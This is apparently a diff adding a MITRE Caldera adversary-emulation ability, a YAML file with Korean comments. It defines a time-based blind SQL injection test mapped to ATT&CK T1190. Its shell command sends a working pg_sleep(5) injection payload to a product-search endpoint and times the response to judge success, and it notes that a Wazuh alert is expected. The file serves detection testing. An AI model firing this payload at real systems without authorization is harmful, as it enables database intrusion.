@@ -1,0 +1,35 @@
+- id: 22b3c4d5-6e7f-4890-9bcd-ef0123456002
+  name: Blind SQL Injection - Time-Based
+  description: pg_sleep()을 subquery 형태로 임베드하여 시간 기반 블라인드 SQLi를 수행합니다. 응답 본문에 데이터 노출 없이 응답 지연(5초)으로 참/거짓을 판별합니다.
+  tactic: initial-access
+  technique:
+    attack_id: T1190
+    name: Exploit Public-Facing Application
+  platforms:
+    linux:
+      sh:
+        command: |-
+          OP_ID="#{operation_id}"
+          TECH_ID="T1190"
+          ABILITY_ID="22b3c4d5-6e7f-4890-9bcd-ef0123456002"
+          TARGET="http://#{target.url}"
+          SLEEP_THRESHOLD=4
+
+          echo "[*] Time-Based Blind SQLi - pg_sleep(5) subquery 주입"
+
+          ELAPSED=$(curl -s -o /dev/null -w "%{time_total}" \
+            -H "X-Caldera-Op-Id: ${OP_ID}" \
+            -H "X-Caldera-Technique: ${TECH_ID}" \
+            -H "X-Caldera-Ability: ${ABILITY_ID}" \
+            -A "Caldera/${OP_ID}/${TECH_ID}/${ABILITY_ID}" \
+            "${TARGET}/api/products/search?keyword=%27+OR+(SELECT+1+FROM+pg_sleep(5))%3D1--")
+
+          echo "[+] elapsed=${ELAPSED}s (threshold=${SLEEP_THRESHOLD}s)"
+
+          # 정수 비교를 위해 소수점 버림
+          ELAPSED_INT=${ELAPSED%.*}
+          if [ "${ELAPSED_INT}" -ge "${SLEEP_THRESHOLD}" ]; then
+            echo "[+] 응답 지연 검출 - Time-Based Blind SQLi 성공 (Wazuh TIME_BASED_DELAY 발동 예상)"
+          else
+            echo "[-] 지연 미발생 - JDBC 차단 또는 페이로드 오류 가능성"
+          fi
